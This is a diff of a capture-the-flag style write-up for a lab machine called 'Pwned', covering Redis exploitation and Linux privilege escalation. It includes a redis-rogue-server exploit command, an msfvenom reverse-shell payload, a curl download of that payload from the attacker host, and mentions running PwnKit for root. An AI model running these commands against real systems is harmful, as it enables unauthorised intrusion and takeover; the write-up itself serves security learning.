@@ -1,8 +1,8 @@
-#Pwned
+#Pwned #KernelExploit #Redis
 ```IP
 192.168.189.176
 ```
-## Enumeration
+# Enumeration
 ## Nmap
 
 As always I start enumerating target ports with nmap:
@@ -24,35 +24,39 @@ PORT     STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 ## REDIS
+As shown in the nmap scan, we have a vulnerable redis version. It has the following well-known exploit in github https://github.com/n0b0dyCN/redis-rogue-server . We can exploit it with the following command:
 ```
 python3.11 redis-rogue-server.py --rhost 192.168.222.176 --lhost 192.168.45.193 --exp=exp.so
 ```
-create a more stable shell
+In our local machine we can create a more estable shell than the one provided in the exploit:
+
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=4444 -a x64 -f elf -o shell
 ```
+Using the exploit shell we will download our newly created reverse shell:
 ```
 curl http://192.168.45.193:8000/shell -o shell
 ```
-call it and boom
+
+And execute it:
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241116132103.png?raw=true)
-local flag achieved
+
+Now we are logged in as prudence user, and we have access to the local flag.
 # PrivEsc
 
 ## Manual
+In our user's directory we find a interesting notes.txt file:
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241116132530.png?raw=true)
 
-
+But it does not seem to lead to any PE vector.
 ## Automated
 
 ### Peass
-CVE-2017-5618 setuid screen v4.5.0 LPE
-PwnKit
+When executing LinPeass it prompts various kernel exploits as probable PE vectors, the most recommended being PwnKit. In the oficial PwnKit github page we find the following one line command which downloads and executes the exploit.
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241117111500.png?raw=true)
-root
 
-### Mimikatz
-
+After copying and executing the command we get root access easily.
 
